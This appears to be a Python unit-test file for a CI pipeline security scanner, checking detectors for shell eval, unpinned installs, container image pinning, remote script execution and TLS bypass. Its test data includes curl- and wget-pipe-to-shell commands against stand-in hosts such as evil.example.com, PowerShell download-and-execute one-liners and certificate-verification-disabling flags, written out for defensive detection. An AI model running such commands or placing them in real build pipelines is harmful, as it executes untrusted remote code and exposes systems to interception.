"""Unit tests for the cross-provider detection primitives under
``pipeline_check/core/checks/_primitives/``.

These lock in the positive / negative behaviour for each pattern
catalogue. Per-provider rule modules are thin wrappers that call
these primitives, so the rule-level tests (see
``tests/test_workflow_fixtures.py``) exercise the wiring; these
tests exercise the primitive's logic in isolation without the YAML
loading round-trip.
"""
from __future__ import annotations

import pytest

from pipeline_check.core.checks._primitives import (
    container_image,
    lockfile_integrity,
    remote_script_exec,
    shell_eval,
    tls_bypass,
)

# ──────────────────────────────────────────────────────────────────
# shell_eval
# ──────────────────────────────────────────────────────────────────


class TestShellEvalPositives:
    @pytest.mark.parametrize("text,kind", [
        ('eval "$CMD"', "eval"),
        ("eval $USER_INPUT", "eval"),
        ("eval ${VAR}", "eval"),
        # Single-quoted args are also risky — eval re-parses the
        # literal string and expansion happens on the re-parse.
        ("eval '$X'", "eval"),
        # Command-substitution whose inner command expands a variable.
        ('eval "$(curl $URL)"', "eval"),
        # Unquoted eval of command-substitution with a variable arg.
        ("eval $(curl $URL)", "eval"),
        ('sh -c "$CMD"', "sh-c"),
        ("sh -c $X", "sh-c"),
        ("bash -c ${CMD}", "sh-c"),
        ("sh -c '$X'", "sh-c"),
        ("sh -c $(cat $FILE)", "sh-c"),
        ('bash -c "$(echo $VAR)"', "sh-c"),
        ("result=`$TOOL --version`", "backtick"),
        ("out=$( $TOOL arg )", "cmdsub"),
    ])
    def test_risky_idiom_flagged(self, text, kind):
        hits = shell_eval.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind for h in hits)

    def test_dedup_single_hit_for_overlapping_eval_patterns(self):
        """``eval "$(curl $URL)"`` matches both the cmdsub-var regex
        and the var-in-quotes regex. The scan must collapse them so
        the finding description doesn't double-count."""
        hits = shell_eval.scan('eval "$(curl $URL)"')
        assert len(hits) == 1

    def test_multi_line_blob_counts_each_occurrence(self):
        blob = "eval $A\neval $B\nsh -c $C"
        hits = shell_eval.scan(blob)
        assert len(hits) == 3


class TestShellEvalNegatives:
    @pytest.mark.parametrize("text", [
        # Literal command substitution — idiomatic bootstrap.
        'eval "$(ssh-agent -s)"',
        # Literal shell-c body — no variable.
        'sh -c "echo hello"',
        # Literal command in $().
        "value=$(date)",
        # Echoing a variable without shell re-parse — safe.
        'echo "$USER"',
        # No shell metacharacters involved.
        "VAR=value",
    ])
    def test_safe_idiom_not_flagged(self, text):
        assert shell_eval.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# lockfile_integrity
# ──────────────────────────────────────────────────────────────────


class TestLockfilePositives:
    @pytest.mark.parametrize("text,kind", [
        # Git URL without SHA pin — lockfile cannot protect.
        ("pip install git+https://github.com/foo/bar.git", "git"),
        ("npm install git+ssh://git@github.com/foo/bar.git", "git"),
        ("cargo install --git https://github.com/foo/bar", "git"),
        # GitHub shorthand — resolves to default branch.
        ("npm install some-org/my-repo", "git"),
        # Local-path installs.
        ("pip install ./my-lib", "path"),
        ("pip install file:///srv/wheels/foo.whl", "path"),
        ("npm install /opt/shared/pkg", "path"),
        ("yarn add file:./local", "path"),
        # Direct tarball URLs.
        ("pip install https://example.com/pkg.tar.gz", "tarball"),
        ("npm install https://example.com/pkg.tgz", "tarball"),
    ])
    def test_bypass_flagged(self, text, kind):
        hits = lockfile_integrity.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind for h in hits)


class TestLockfileNegatives:
    @pytest.mark.parametrize("text", [
        # Registry install with version pin.
        "pip install requests==2.28.1",
        "npm install express",
        # Lockfile-enforcing install.
        "npm ci",
        # Git URL pinned to a commit SHA.
        "pip install git+https://github.com/foo/bar.git@" + "a" * 40,
        ("cargo install --git https://github.com/foo/bar --rev " + "a" * 40),
        # Bare ``.`` — current-package build, legitimate.
        "pip install .",
        # No install command at all.
        "echo 'installing'",
    ])
    def test_safe_install_not_flagged(self, text):
        assert lockfile_integrity.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# Integration sanity — both primitives exposed through the provider
# rule modules and picked up by the orchestrator.
# ──────────────────────────────────────────────────────────────────


def test_shell_eval_rule_registered_for_every_workflow_provider():
    """Every workflow provider should have a rule module calling
    the shell_eval primitive — easy regression guard if someone
    ships a new primitive and forgets to wire one provider."""
    from pipeline_check.core.checks.rule import discover_rules
    expected = {
        "pipeline_check.core.checks.github.rules": "GHA-028",
        "pipeline_check.core.checks.gitlab.rules": "GL-026",
        "pipeline_check.core.checks.bitbucket.rules": "BB-026",
        "pipeline_check.core.checks.azure.rules": "ADO-027",
        "pipeline_check.core.checks.circleci.rules": "CC-027",
        "pipeline_check.core.checks.jenkins.rules": "JF-030",
    }
    for pkg, rule_id in expected.items():
        ids = {r.id for r, _ in discover_rules(pkg)}
        assert rule_id in ids, f"{rule_id} missing under {pkg}"


def test_lockfile_integrity_rule_registered_for_every_workflow_provider():
    from pipeline_check.core.checks.rule import discover_rules
    expected = {
        "pipeline_check.core.checks.github.rules": "GHA-029",
        "pipeline_check.core.checks.gitlab.rules": "GL-027",
        "pipeline_check.core.checks.bitbucket.rules": "BB-027",
        "pipeline_check.core.checks.azure.rules": "ADO-028",
        "pipeline_check.core.checks.circleci.rules": "CC-028",
        "pipeline_check.core.checks.jenkins.rules": "JF-031",
    }
    for pkg, rule_id in expected.items():
        ids = {r.id for r, _ in discover_rules(pkg)}
        assert rule_id in ids, f"{rule_id} missing under {pkg}"


# ──────────────────────────────────────────────────────────────────
# container_image
# ──────────────────────────────────────────────────────────────────


class TestContainerImageClassify:
    def test_aws_managed_image_is_pinned(self):
        info = container_image.classify("aws/codebuild/standard:7.0")
        assert info.aws_managed is True
        assert info.pinned is True
        assert info.digest is None

    def test_digest_pinned_image(self):
        ref = "ghcr.io/corp/builder@sha256:" + "a" * 64
        info = container_image.classify(ref)
        assert info.pinned is True
        assert info.digest == "a" * 64
        assert info.trusted_registry is True

    def test_tag_only_image_not_pinned(self):
        info = container_image.classify("ghcr.io/corp/builder:v1")
        assert info.pinned is False
        assert info.digest is None
        assert info.tag == "v1"
        assert info.trusted_registry is True

    def test_docker_hub_shortform_untrusted(self):
        info = container_image.classify("python:3.11")
        assert info.pinned is False
        assert info.trusted_registry is False
        assert info.registry == ""
        assert info.tag == "3.11"

    def test_public_ecr_trusted_but_not_pinned_without_digest(self):
        info = container_image.classify("public.ecr.aws/amazonlinux/amazonlinux:2023")
        assert info.trusted_registry is True
        assert info.pinned is False
        assert info.registry == "public.ecr.aws"

    def test_registry_with_port_tag_split(self):
        # ``registry:5000/repo:v1`` must not be misread as tag=``5000/repo:v1``.
        info = container_image.classify("registry.internal:5000/team/app:v1")
        assert info.tag == "v1"

    def test_empty_ref_treated_as_pinned(self):
        info = container_image.classify("")
        assert info.ref == ""
        assert info.pinned is True  # nothing for the rule to score against

    def test_none_ref_accepted(self):
        info = container_image.classify(None)
        assert info.ref == ""
        assert info.pinned is True


# ──────────────────────────────────────────────────────────────────
# remote_script_exec
# ──────────────────────────────────────────────────────────────────


class TestRemoteScriptExecPositives:
    @pytest.mark.parametrize("text,kind,interp", [
        ("curl https://evil.example.com/x.sh | bash", "curl-pipe", "bash"),
        ("wget -qO- https://evil.example.com/x | sh", "curl-pipe", "sh"),
        ("curl -fsSL https://e.x/loader.py | python3", "curl-pipe", "python3"),
        ("curl -L https://e.x/x | sudo bash", "curl-pipe", "bash"),
        # bash -c "$(curl ...)" — re-enter shell on fetched content.
        ('bash -c "$(curl -fsSL https://e.x/bootstrap)"', "shell-subshell", "bash"),
        ("sh -c '$(wget -qO- https://e.x/boot)'", "shell-subshell", "sh"),
        # Download then execute on the same line.
        ("curl https://e.x/x.sh > /tmp/x.sh ; bash /tmp/x.sh", "download-exec", "bash"),
        # Python inline fetcher.
        ('python -c "import urllib.request;urllib.request.urlopen(\'https://e.x/p\').read()"',
         "python-inline", "python"),
        # PowerShell one-liners.
        ("irm https://e.x/install.ps1 | iex", "powershell", "iex"),
        ("Invoke-WebRequest https://e.x/x.ps1 | iex", "powershell", "iex"),
    ])
    def test_idiom_flagged(self, text, kind, interp):
        hits = remote_script_exec.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind and h.interpreter == interp for h in hits), \
            f"got {[(h.kind, h.interpreter) for h in hits]}"

    def test_url_and_host_extracted(self):
        hits = remote_script_exec.scan("curl https://evil.example.com/x | bash")
        assert len(hits) == 1
        assert hits[0].url == "https://evil.example.com/x"
        assert hits[0].host == "evil.example.com"

    def test_vendor_installer_marked_trusted(self):
        hits = remote_script_exec.scan("curl --proto '=https' -sSf https://sh.rustup.rs | sh")
        assert hits and hits[0].vendor_trusted is True

    def test_vendor_subdomain_marked_trusted(self):
        # Subdomain of an allowlisted vendor host.
        hits = remote_script_exec.scan("curl -fsSL https://get.bun.sh/install | bash")
        assert hits and hits[0].vendor_trusted is True

    def test_unknown_host_not_trusted(self):
        hits = remote_script_exec.scan("curl https://evil.example.com/x | bash")
        assert hits and hits[0].vendor_trusted is False

    def test_shell_subshell_not_double_counted_as_pipe(self):
        """``bash -c "$(curl URL)"`` contains a raw ``curl URL`` the
        generic pipe regex would otherwise also claim."""
        hits = remote_script_exec.scan('bash -c "$(curl -fsSL https://e.x/x)"')
        assert len(hits) == 1
        assert hits[0].kind == "shell-subshell"


class TestRemoteScriptExecNegatives:
    @pytest.mark.parametrize("text", [
        # Downloads the script but only runs checksum, not interpreter.
        "curl -fsSL https://e.x/x.sh -o /tmp/x.sh && sha256sum /tmp/x.sh",
        # curl without pipe — just a file download.
        "curl -fsSL https://e.x/x.tar.gz -o /tmp/x.tar.gz",
        # Piping to a non-interpreter.
        "curl -fsSL https://e.x/x | tee /tmp/x.log",
        # Echoing a curl command, not running it.
        'echo "run: curl foo | bash"',
        # No URL at all.
        "bash -c 'echo hi'",
    ])
    def test_safe_idiom_not_flagged(self, text):
        assert remote_script_exec.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# tls_bypass
# ──────────────────────────────────────────────────────────────────


class TestTlsBypassPositives:
    @pytest.mark.parametrize("text,tool", [
        ("npm config set strict-ssl false", "npm"),
        ("yarn config set strict-ssl false", "yarn"),
        ("pip config set global.trusted-host pypi.org", "pip"),
        ("git config --global http.sslVerify false", "git"),
        ("GIT_SSL_NO_VERIFY=1 git clone https://e.x/r.git", "git"),
        ("export NODE_TLS_REJECT_UNAUTHORIZED=0", "node"),
        ("PYTHONHTTPSVERIFY=0 python app.py", "python"),
        ("curl -k https://e.x/x", "curl"),
        ("curl --insecure https://e.x/x", "curl"),
        ("wget --no-check-certificate https://e.x/x", "wget"),
        ("GOINSECURE=*.internal go get ./...", "go"),
        # New coverage added by the primitive (previously not detected).
        ("helm install mychart --insecure-skip-tls-verify", "helm"),
        ("kubectl get po --insecure-skip-tls-verify", "kubectl"),
        ("ssh -o StrictHostKeyChecking=no user@host", "ssh"),
        ("ssh -o UserKnownHostsFile=/dev/null user@host", "ssh"),
    ])
    def test_bypass_flagged(self, text, tool):
        hits = tls_bypass.scan(text)
        assert hits, f"expected {tool!r} hit for {text!r}"
        assert any(h.tool == tool for h in hits), \
            f"expected tool={tool!r}, got {[h.tool for h in hits]}"


class TestTlsBypassNegatives:
    @pytest.mark.parametrize("text", [
        # strict-ssl true — the safe direction.
        "npm config set strict-ssl true",
        # curl over HTTPS without bypass flags — normal.
        "curl -fsSL https://e.x/x",
        # ssh with default verification — no -o flag.
        "ssh user@host 'uptime'",
        # helm / kubectl with no insecure flag.
        "helm install mychart ./chart",
        "kubectl get po -n kube-system",
        # Documentation-shaped string with ``false`` in a different field.
        "echo 'sslVerify is currently false in the bug report'",
    ])
    def test_safe_usage_not_flagged(self, text):
        assert tls_bypass.scan(text) == []
